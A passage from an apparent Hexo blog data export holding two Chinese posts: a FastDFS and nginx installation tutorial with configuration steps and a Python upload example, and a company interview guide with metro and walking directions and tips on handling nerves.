fdfs和那llibfastcommon依赖还有fdfs-ngx-module还有nginx链接模块都可以直接克隆相对应仓库\n\n### 安装nginx及fastdfs-nginx-module\n\n#### 解压缩 fastdfs-nginx-module-master.zip\n\n```shell\nsudo ./configure --prefix=/usr/local/nginx/ --add-module=fastdfs-nginx-module-master解压后的目录的绝对路径/src\n```\n\n#### 如果nginx还没安装执行\n```shell\nsudo ./make\nsudo ./make install\n```\n```shell\n./configure --with-http_ssl_module --with-openssl=../openssl-1.1.1m  --with-pcre=../pcre-8.42 --with-zlib=../zlib-1.2.11 --prefix=/usr/local/nginx/ --add-module=/usr/share/fastdfs/fastdfs-nginx-module-master/src\n```\n\n#### 如果nginx安装了执行\n> sudo ./make\n\n```shell\nsudo cp fastdfs-nginx-module-master解压后的目录中src下的mod_fastdfs.conf  /etc/fdfs/mod_fastdfs.conf\n```\n> sudo vim /etc/fdfs/mod_fastdfs.conf\n\n```text\n修改内容：\n\nconnect_timeout=10\n\ntracker_server=自己ubuntu虚拟机的ip地址:22122\n\nurl_have_group_name=true\n\nstore_path0=/home/python/fastdfs/storage\n```\n\n> sudo cp 解压缩的fastdfs-master目录中的http.conf  /etc/fdfs/http.conf\n\n> sudo cp 解压缩的fastdfs-master目录中的mime.types /etc/fdfs/mime.types\n\n> sudo vim /usr/local/nginx/conf/nginx.conf\n\n> 在http部分中添加配置信息如下(反向代理)：\n\n```shell\nserver {\n\n        listen       8888;\n\n        server_name  localhost;\n\n        location ~/group[0-9]/ {\n\n            ngx_fastdfs_module;\n\n        }\n\n        error_page   500 502 503 504  /50x.html;\n\n        location = /50x.html {\n\n        root   html;\n\n        }\n\n}\n```\n#### 启动nginx\n```shell\nsudo /usr/local/nginx/sbin/nginx\n```\n\n> 在换ip之后，storage.conf和client.conf还有mod_fastdfs.cong\n\n\n#### python使用fdfs\n\n```shell\npip install fdfs_client-py-master.zip\n\n>>> from fdfs_client.client import Fdfs_client\n\n>>> client = Fdfs_client('/etc/fdfs/client.conf')\n\n>>> ret = client.upload_by_filename('test')\n\n>>> ret\n```\n```\n{'Groupname':'group1','Status':'Uploadsuccessed.','Remotefile_id':'group1/M00/00/00/wKjzh0_xaR63RExnAAAaDqbNk5E1398.py','Uploadedsize':'6.0KB','Localfilename':'test', 'Storage IP':'192.168.243.133'}\n    ```","slug":"nginx-fdfs搭建","published":1,"updated":"2023-03-10T02:55:02.447Z","_id":"cldljul8e00005kvg1pf0fc1n","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Nginx-FastDfs\"><a href=\"#Nginx-FastDfs\" class=\"headerlink\" title=\"Nginx+FastDfs\"></a>Nginx+FastDfs</h2><p><a href=\"https://github.com/happyfish100\">hfdfs项目</a>     fdfs和那llibfastcommon依赖还有fdfs-ngx-module还有nginx链接模块都可以直接克隆相对应仓库</p>\n<h3 id=\"安装nginx及fastdfs-nginx-module\"><a href=\"#安装nginx及fastdfs-nginx-module\" class=\"headerlink\" title=\"安装nginx及fastdfs-nginx-module\"></a>安装nginx及fastdfs-nginx-module</h3><h4 id=\"解压缩-fastdfs-nginx-module-master-zip\"><a href=\"#解压缩-fastdfs-nginx-module-master-zip\" class=\"headerlink\" title=\"解压缩 fastdfs-nginx-module-master.zip\"></a>解压缩 fastdfs-nginx-module-master.zip</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> ./configure <span class=\"token parameter variable\">--prefix</span><span class=\"token operator\">=</span>/usr/local/nginx/ --add-module<span class=\"token operator\">=</span>fastdfs-nginx-module-master解压后的目录的绝对路径/src<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"如果nginx还没安装执行\"><a href=\"#如果nginx还没安装执行\" class=\"headerlink\" title=\"如果nginx还没安装执行\"></a>如果nginx还没安装执行</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> ./make\n<span class=\"token function\">sudo</span> ./make <span class=\"token function\">install</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">./configure --with-http_ssl_module --with-openssl<span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/openssl-1.1.1m  --with-pcre<span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/pcre-8.42 --with-zlib<span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/zlib-1.2.11 <span class=\"token parameter variable\">--prefix</span><span class=\"token operator\">=</span>/usr/local/nginx/ --add-module<span class=\"token operator\">=</span>/usr/share/fastdfs/fastdfs-nginx-module-master/src<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"如果nginx安装了执行\"><a href=\"#如果nginx安装了执行\" class=\"headerlink\" title=\"如果nginx安装了执行\"></a>如果nginx安装了执行</h4><blockquote>\n<p>sudo ./make</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">cp</span> fastdfs-nginx-module-master解压后的目录中src下的mod_fastdfs.conf  /etc/fdfs/mod_fastdfs.conf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<blockquote>\n<p>sudo vim /etc/fdfs/mod_fastdfs.conf</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">修改内容：\n\nconnect_timeout=10\n\ntracker_server=自己ubuntu虚拟机的ip地址:22122\n\nurl_have_group_name=true\n\nstore_path0=/home/python/fastdfs/storage<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>sudo cp 解压缩的fastdfs-master目录中的http.conf  /etc/fdfs/http.conf</p>\n</blockquote>\n<blockquote>\n<p>sudo cp 解压缩的fastdfs-master目录中的mime.types /etc/fdfs/mime.types</p>\n</blockquote>\n<blockquote>\n<p>sudo vim /usr/local/nginx/conf/nginx.conf</p>\n</blockquote>\n<blockquote>\n<p>在http部分中添加配置信息如下(反向代理)：</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">server <span class=\"token punctuation\">&#123;</span>\n\n        listen       <span class=\"token number\">8888</span><span class=\"token punctuation\">;</span>\n\n        server_name  localhost<span class=\"token punctuation\">;</span>\n\n        location ~/group<span class=\"token punctuation\">[</span><span class=\"token number\">0</span>-9<span class=\"token punctuation\">]</span>/ <span class=\"token punctuation\">&#123;</span>\n\n            ngx_fastdfs_module<span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n\n        error_page   <span class=\"token number\">500</span> <span class=\"token number\">502</span> <span class=\"token number\">503</span> <span class=\"token number\">504</span>  /50x.html<span class=\"token punctuation\">;</span>\n\n        location <span class=\"token operator\">=</span> /50x.html <span class=\"token punctuation\">&#123;</span>\n\n        root   html<span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"启动nginx\"><a href=\"#启动nginx\" class=\"headerlink\" title=\"启动nginx\"></a>启动nginx</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> /usr/local/nginx/sbin/nginx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>在换ip之后，storage.conf和client.conf还有mod_fastdfs.cong</p>\n</blockquote>\n<h4 id=\"python使用fdfs\"><a href=\"#python使用fdfs\" class=\"headerlink\" title=\"python使用fdfs\"></a>python使用fdfs</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pip <span class=\"token function\">install</span> fdfs_client-py-master.zip\n\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> from fdfs_client.client <span class=\"token function\">import</span> Fdfs_client\n\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> client <span class=\"token operator\">=</span> Fdfs_client<span class=\"token punctuation\">(</span><span class=\"token string\">'/etc/fdfs/client.conf'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> ret <span class=\"token operator\">=</span> client.upload_by_filename<span class=\"token punctuation\">(</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> ret<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;&#39;Groupname&#39;:&#39;group1&#39;,&#39;Status&#39;:&#39;Uploadsuccessed.&#39;,&#39;Remotefile_id&#39;:&#39;group1&#x2F;M00&#x2F;00&#x2F;00&#x2F;wKjzh0_xaR63RExnAAAaDqbNk5E1398.py&#39;,&#39;Uploadedsize&#39;:&#39;6.0KB&#39;,&#39;Localfilename&#39;:&#39;test&#39;, &#39;Storage IP&#39;:&#39;192.168.243.133&#39;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Nginx-FastDfs\"><a href=\"#Nginx-FastDfs\" class=\"headerlink\" title=\"Nginx+FastDfs\"></a>Nginx+FastDfs</h2><p><a href=\"https://github.com/happyfish100\">hfdfs项目</a>     fdfs和那llibfastcommon依赖还有fdfs-ngx-module还有nginx链接模块都可以直接克隆相对应仓库</p>\n<h3 id=\"安装nginx及fastdfs-nginx-module\"><a href=\"#安装nginx及fastdfs-nginx-module\" class=\"headerlink\" title=\"安装nginx及fastdfs-nginx-module\"></a>安装nginx及fastdfs-nginx-module</h3><h4 id=\"解压缩-fastdfs-nginx-module-master-zip\"><a href=\"#解压缩-fastdfs-nginx-module-master-zip\" class=\"headerlink\" title=\"解压缩 fastdfs-nginx-module-master.zip\"></a>解压缩 fastdfs-nginx-module-master.zip</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> ./configure <span class=\"token parameter variable\">--prefix</span><span class=\"token operator\">=</span>/usr/local/nginx/ --add-module<span class=\"token operator\">=</span>fastdfs-nginx-module-master解压后的目录的绝对路径/src<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"如果nginx还没安装执行\"><a href=\"#如果nginx还没安装执行\" class=\"headerlink\" title=\"如果nginx还没安装执行\"></a>如果nginx还没安装执行</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> ./make\n<span class=\"token function\">sudo</span> ./make <span class=\"token function\">install</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">./configure --with-http_ssl_module --with-openssl<span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/openssl-1.1.1m  --with-pcre<span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/pcre-8.42 --with-zlib<span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/zlib-1.2.11 <span class=\"token parameter variable\">--prefix</span><span class=\"token operator\">=</span>/usr/local/nginx/ --add-module<span class=\"token operator\">=</span>/usr/share/fastdfs/fastdfs-nginx-module-master/src<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"如果nginx安装了执行\"><a href=\"#如果nginx安装了执行\" class=\"headerlink\" title=\"如果nginx安装了执行\"></a>如果nginx安装了执行</h4><blockquote>\n<p>sudo ./make</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">cp</span> fastdfs-nginx-module-master解压后的目录中src下的mod_fastdfs.conf  /etc/fdfs/mod_fastdfs.conf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<blockquote>\n<p>sudo vim /etc/fdfs/mod_fastdfs.conf</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">修改内容：\n\nconnect_timeout=10\n\ntracker_server=自己ubuntu虚拟机的ip地址:22122\n\nurl_have_group_name=true\n\nstore_path0=/home/python/fastdfs/storage<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>sudo cp 解压缩的fastdfs-master目录中的http.conf  /etc/fdfs/http.conf</p>\n</blockquote>\n<blockquote>\n<p>sudo cp 解压缩的fastdfs-master目录中的mime.types /etc/fdfs/mime.types</p>\n</blockquote>\n<blockquote>\n<p>sudo vim /usr/local/nginx/conf/nginx.conf</p>\n</blockquote>\n<blockquote>\n<p>在http部分中添加配置信息如下(反向代理)：</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">server <span class=\"token punctuation\">&#123;</span>\n\n        listen       <span class=\"token number\">8888</span><span class=\"token punctuation\">;</span>\n\n        server_name  localhost<span class=\"token punctuation\">;</span>\n\n        location ~/group<span class=\"token punctuation\">[</span><span class=\"token number\">0</span>-9<span class=\"token punctuation\">]</span>/ <span class=\"token punctuation\">&#123;</span>\n\n            ngx_fastdfs_module<span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n\n        error_page   <span class=\"token number\">500</span> <span class=\"token number\">502</span> <span class=\"token number\">503</span> <span class=\"token number\">504</span>  /50x.html<span class=\"token punctuation\">;</span>\n\n        location <span class=\"token operator\">=</span> /50x.html <span class=\"token punctuation\">&#123;</span>\n\n        root   html<span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"启动nginx\"><a href=\"#启动nginx\" class=\"headerlink\" title=\"启动nginx\"></a>启动nginx</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> /usr/local/nginx/sbin/nginx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>在换ip之后，storage.conf和client.conf还有mod_fastdfs.cong</p>\n</blockquote>\n<h4 id=\"python使用fdfs\"><a href=\"#python使用fdfs\" class=\"headerlink\" title=\"python使用fdfs\"></a>python使用fdfs</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pip <span class=\"token function\">install</span> fdfs_client-py-master.zip\n\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> from fdfs_client.client <span class=\"token function\">import</span> Fdfs_client\n\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> client <span class=\"token operator\">=</span> Fdfs_client<span class=\"token punctuation\">(</span><span class=\"token string\">'/etc/fdfs/client.conf'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> ret <span class=\"token operator\">=</span> client.upload_by_filename<span class=\"token punctuation\">(</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> ret<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;&#39;Groupname&#39;:&#39;group1&#39;,&#39;Status&#39;:&#39;Uploadsuccessed.&#39;,&#39;Remotefile_id&#39;:&#39;group1&#x2F;M00&#x2F;00&#x2F;00&#x2F;wKjzh0_xaR63RExnAAAaDqbNk5E1398.py&#39;,&#39;Uploadedsize&#39;:&#39;6.0KB&#39;,&#39;Localfilename&#39;:&#39;test&#39;, &#39;Storage IP&#39;:&#39;192.168.243.133&#39;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>"},{"title":"四川物连数智科技","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-02-01T11:06:08.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"四川物连数智科技面试指南","_content":"# 欢迎您来到[四川物连数智科技](https://www.tianyancha.com/company/4356543553)面试\n四川物连数智科技有限公司，成立于2021年，位于四川省成都市，是一家以从事研究和试验发展为主的企业。\n## 收到面试邀请要怎么去？\n\n> 以从[天府广场](https://baike.baidu.com/item/%E5%A4%A9%E5%BA%9C%E5%B9%BF%E5%9C%BA/1533806)为例\n\n### 天府广场地铁搭乘\n\n> 进入天府广场地铁站之后根据指示牌到一号线位置\n\n> 乘坐开往科学城方向的地铁\n\n> 到达省体育馆之后下车\n![shengtiyuguan.jpg](https://s2.loli.net/2023/02/01/375rlxqCGgo42MU.jpg)\n\n### 省体育馆地铁换乘\n\n> 在省体育馆站内根据指示牌到三号线位置换乘\n\n> 乘坐开往双流西站方向的地铁\n\n> 到达太平园站之后下车\n\n![taipingyuan.jpg](https://s2.loli.net/2023/02/01/c1ubwKPYZViRDq3.jpg)\n\n### 太平园地铁换乘\n\n> 在太平园站内根据指示牌到十号线位置换乘\n\n> 乘坐开往新平方向的地铁\n\n> 到达新津站之后下车出站\n\n![tianfuguangchang.jpg](https://s2.loli.net/2023/02/01/NKuAGSRs1mhvxTz.jpg)\n\n### 从新津站到公司\n\n> 从新津站A口出站来按照如下导航步行到公司\n\n![daohang.jpg](https://s2.loli.net/2023/02/01/XvepRP5T7AJIH6C.jpg)\n\n#### 具体导航\n\n> 出站来到这里向左\n\n![1.jpg](https://s2.loli.net/2023/02/01/yBovVJUrdcH4hgb.jpg)\n\n> 步行到斑马线\n\n![2.jpg](https://s2.loli.net/2023/02/01/PJTZbq6R2mQFW5h.jpg)\n![3.jpg](https://s2.loli.net/2023/02/01/MehpJW1dtE3woB4.jpg)\n\n> 过斑马线之后向左个斑马线位置\n\n![4.jpg](https://s2.loli.net/2023/02/01/LoMbKxkImVs3edS.jpg)\n![5.jpg](https://s2.loli.net/2023/02/01/6QABp3Vg9fmsWnj.jpg)\n\n> 到达这里之后背后有这样的标识\n\n![7.jpg](https://s2.loli.net/2023/02/01/NZHQMgLsemyBojr.jpg)\n\n> 过去之后直走不要向右\n\n![1.jpg](https://s2.loli.net/2023/02/01/5yrwpeoHSJulnqc.jpg)\n\n> 走到看到`数字经济产业互联网基地`停止\n\n![2.jpg](https://s2.loli.net/2023/02/01/C4xMlvaJHWIyBnz.jpg)\n\n> 从LoftB进入乘坐电梯到二楼(电梯两边都有按钮)\n\n![3.jpg](https://s2.loli.net/2023/02/01/exT6g3BS87u9zJK.jpg)\n![4.jpg](https://s2.loli.net/2023/02/01/kR4ajXsfeQ1SyD8.jpg)\n\n> 到二楼之后往左走到205你就到了面试地点了\n\n![6.jpg](https://s2.loli.net/2023/02/01/FwmcjivWnrPpyg4.jpg)\n![7.jpg](https://s2.loli.net/2023/02/01/794fjOskN2FMQVc.jpg)\n\n\n## 如何看待面试\n\n### 怎样才能不紧张\n\n如果你没有过面试经历，那么第一次面试肯定会有一定的压力，会紧张，这样会影响自己的发挥水平，你可以通过以下方式缓解压力：\n\n- 吃好早饭/午饭\n保证自己精神饱满\n\n- 给自己打气\n心理暗示比想象的要重要很多。不断对自己说我能行！我可以！之类鼓舞自己的句子，可以无形中化解紧张\n\n- 家人、朋友的鼓励\n家人、朋友的支持、鼓励和肯定是治愈焦虑最好的良药，他们可以帮你找到自己的闪光点，让你找到自信。所以找朋友疏解紧张情绪也是个不错的办法\n\n- 微笑\n微笑可以让人心态变得更积极\n\n\n如果你已经有了丰富的面试经历，那么你只需要为面试做好充分准备即可","source":"_posts/四川物连数智科技.md","raw":"---\ntitle: 四川物连数智科技\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-02-01 19:06:08\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: 四川物连数智科技面试指南\ntags: 面试\ncategories: 指南\n---\n# 欢迎您来到[四川物连数智科技](https://www.tianyancha.com/company/4356543553)面试\n四川物连数智科技有限公司，成立于2021年，位于四川省成都市，是一家以从事研究和试验发展为主的企业。\n## 收到面试邀请要怎么去？\n\n> 以从[天府广场](https://baike.baidu.com/item/%E5%A4%A9%E5%BA%9C%E5%B9%BF%E5%9C%BA/1533806)为例\n\n### 天府广场地铁搭乘\n\n> 进入天府广场地铁站之后根据指示牌到一号线位置\n\n> 乘坐开往科学城方向的地铁\n\n> 到达省体育馆之后下车\n![shengtiyuguan.jpg](https://s2.loli.net/2023/02/01/375rlxqCGgo42MU.jpg)\n\n### 省体育馆地铁换乘\n\n> 在省体育馆站内根据指示牌到三号线位置换乘\n\n> 乘坐开往双流西站方向的地铁\n\n> 到达太平园站之后下车\n\n![taipingyuan.jpg](https://s2.loli.net/2023/02/01/c1ubwKPYZViRDq3.jpg)\n\n### 太平园地铁换乘\n\n> 在太平园站内根据指示牌到十号线位置换乘\n\n> 乘坐开往新平方向的地铁\n\n> 到达新津站之后下车出站\n\n![tianfuguangchang.jpg](https://s2.loli.net/2023/02/01/NKuAGSRs1mhvxTz.jpg)\n\n### 从新津站到公司\n\n> 从新津站A口出站来按照如下导航步行到公司\n\n![daohang.jpg](https://s2.loli.net/2023/02/01/XvepRP5T7AJIH6C.jpg)\n\n#### 具体导航\n\n> 出站来到这里向左\n\n![1.jpg](https://s2.loli.net/2023/02/01/yBovVJUrdcH4hgb.jpg)\n\n> 步行到斑马线\n\n![2.jpg](https://s2.loli.net/2023/02/01/PJTZbq6R2mQFW5h.jpg)\n![3.jpg](https://s2.loli.net/2023/02/01/MehpJW1dtE3woB4.jpg)\n\n> 过斑马线之后向左个斑马线位置\n\n![4.jpg](https://s2.loli.net/2023/02/01/LoMbKxkImVs3edS.jpg)\n![5.jpg](https://s2.loli.net/2023/02/01/6QABp3Vg9fmsWnj.jpg)\n\n> 到达这里之后背后有这样的标识\n\n![7.jpg](https://s2.loli.net/2023/02/01/NZHQMgLsemyBojr.jpg)\n\n> 过去之后直走不要向右\n\n![1.jpg](https://s2.loli.net/2023/02/01/5yrwpeoHSJulnqc.jpg)\n\n> 走到看到`数字经济产业互联网基地`停止\n\n![2.jpg](https://s2.loli.net/2023/02/01/C4xMlvaJHWIyBnz.jpg)\n\n> 从LoftB进入乘坐电梯到二楼(电梯两边都有按钮)\n\n![3.jpg](https://s2.loli.net/2023/02/01/exT6g3BS87u9zJK.jpg)\n![4.jpg](https://s2.loli.net/2023/02/01/kR4ajXsfeQ1SyD8.jpg)\n\n> 到二楼之后往左走到205你就到了面试地点了\n\n![6.jpg](https://s2.loli.net/2023/02/01/FwmcjivWnrPpyg4.jpg)\n![7.jpg](https://s2.loli.net/2023/02/01/794fjOskN2FMQVc.jpg)\n\n\n## 如何看待面试\n\n### 怎样才能不紧张\n\n如果你没有过面试经历，那么第一次面试肯定会有一定的压力，会紧张，这样会影响自己的发挥水平，你可以通过以下方式缓解压力：\n\n- 吃好早饭/午饭\n保证自己精神饱满\n\n- 给自己打气\n心理暗示比想象的要重要很多。不断对自己说我能行！我可以！之类鼓舞自己的句子，可以无形中化解紧张\n\n- 家人、朋友的鼓励\n家人、朋友的支持、鼓励和肯定是治愈焦虑最好的良药，他们可以帮你找到自己的闪光点，让你找到自信。所以找朋友疏解紧张情绪也是个不错的办法\n\n- 微笑\n微笑可以让人心态变得更积极\n\n\n如果你已经有了丰富的面试经历，那么你只需要为面试做好充分准备即可","slug":"四川物连数智科技","published":1,"updated":"2023-03-10T02:49:52.904Z","_id":"cldlo7icd0000d4vg243wh6on","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"欢迎您来到四川物连数智科技面试\"><a href=\"#欢迎您来到四川物连数智科技面试\" class=\"headerlink\" title=\"欢迎您来到四川物连数智科技面试\"></a>欢迎您来到<a href=\"https://www.tianyancha.com/company/4356543553\">四川物连数智科技</a>面试</h1><p>四川物连数智科技有限公司，成立于2021年，位于四川省成都市，是一家以从事研究和试验发展为主的企业。</p>\n<h2 id=\"收到面试邀请要怎么去？\"><a href=\"#收到面试邀请要怎么去？\" class=\"headerlink\" title=\"收到面试邀请要怎么去？\"></a>收到面试邀请要怎么去？</h2><blockquote>\n<p>以从<a href=\"https://baike.baidu.com/item/%E5%A4%A9%E5%BA%9C%E5%B9%BF%E5%9C%BA/1533806\">天府广场</a>为例</p>\n</blockquote>\n<h3 id=\"天府广场地铁搭乘\"><a href=\"#天府广场地铁搭乘\" class=\"headerlink\" title=\"天府广场地铁搭乘\"></a>天府广场地铁搭乘</h3><blockquote>\n<p>进入天府广场地铁站之后根据指示牌到一号线位置</p>\n</blockquote>\n<blockquote>\n<p>乘坐开往科学城方向的地铁</p>\n</blockquote>\n<blockquote>\n<p>到达省体育馆之后下车<br><img src=\"https://s2.loli.net/2023/02/01/375rlxqCGgo42MU.jpg\" alt=\"shengtiyuguan.jpg\"></p>\n</blockquote>\n<h3 id=\"省体育馆地铁换乘\"><a href=\"#省体育馆地铁换乘\" class=\"headerlink\" title=\"省体育馆地铁换乘\"></a>省体育馆地铁换乘</h3><blockquote>\n<p>在省体育馆站内根据指示牌到三号线位置换乘</p>\n</blockquote>\n<blockquote>\n<p>乘坐开往双流西站方向的地铁</p>\n</blockquote>\n<blockquote>\n<p>到达太平园站之后下车</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/c1ubwKPYZViRDq3.jpg\" alt=\"taipingyuan.jpg\"></p>\n<h3 id=\"太平园地铁换乘\"><a href=\"#太平园地铁换乘\" class=\"headerlink\" title=\"太平园地铁换乘\"></a>太平园地铁换乘</h3><blockquote>\n<p>在太平园站内根据指示牌到十号线位置换乘</p>\n</blockquote>\n<blockquote>\n<p>乘坐开往新平方向的地铁</p>\n</blockquote>\n<blockquote>\n<p>到达新津站之后下车出站</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/NKuAGSRs1mhvxTz.jpg\" alt=\"tianfuguangchang.jpg\"></p>\n<h3 id=\"从新津站到公司\"><a href=\"#从新津站到公司\" class=\"headerlink\" title=\"从新津站到公司\"></a>从新津站到公司</h3><blockquote>\n<p>从新津站A口出站来按照如下导航步行到公司</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/XvepRP5T7AJIH6C.jpg\" alt=\"daohang.jpg\"></p>\n<h4 id=\"具体导航\"><a href=\"#具体导航\" class=\"headerlink\" title=\"具体导航\"></a>具体导航</h4><blockquote>\n<p>出站来到这里向左</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/yBovVJUrdcH4hgb.jpg\" alt=\"1.jpg\"></p>\n<blockquote>\n<p>步行到斑马线</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/PJTZbq6R2mQFW5h.jpg\" alt=\"2.jpg\"><br><img src=\"https://s2.loli.net/2023/02/01/MehpJW1dtE3woB4.jpg\" alt=\"3.jpg\"></p>\n<blockquote>\n<p>过斑马线之后向左个斑马线位置</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/LoMbKxkImVs3edS.jpg\" alt=\"4.jpg\"><br><img src=\"https://s2.loli.net/2023/02/01/6QABp3Vg9fmsWnj.jpg\" alt=\"5.jpg\"></p>\n<blockquote>\n<p>到达这里之后背后有这样的标识</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/NZHQMgLsemyBojr.jpg\" alt=\"7.jpg\"></p>\n<blockquote>\n<p>过去之后直走不要向右</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/5yrwpeoHSJulnqc.jpg\" alt=\"1.jpg\"></p>\n<blockquote>\n<p>走到看到<code>数字经济产业互联网基地</code>停止</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/C4xMlvaJHWIyBnz.jpg\" alt=\"2.jpg\"></p>\n<blockquote>\n<p>从LoftB进入乘坐电梯到二楼(电梯两边都有按钮)</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/exT6g3BS87u9zJK.jpg\" alt=\"3.jpg\"><br><img src=\"https://s2.loli.net/2023/02/01/kR4ajXsfeQ1SyD8.jpg\" alt=\"4.jpg\"></p>\n<blockquote>\n<p>到二楼之后往左走到205你就到了面试地点了</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/FwmcjivWnrPpyg4.jpg\" alt=\"6.jpg\"><br><img src=\"https://s2.loli.net/2023/02/01/794fjOskN2FMQVc.jpg\" alt=\"7.jpg\"></p>\n<h2 id=\"如何看待面试\"><a href=\"#如何看待面试\" class=\"headerlink\" title=\"如何看待面试\"></a>如何看待面试</h2><h3 id=\"怎样才能不紧张\"><a href=\"#怎样才能不紧张\" class=\"headerlink\" 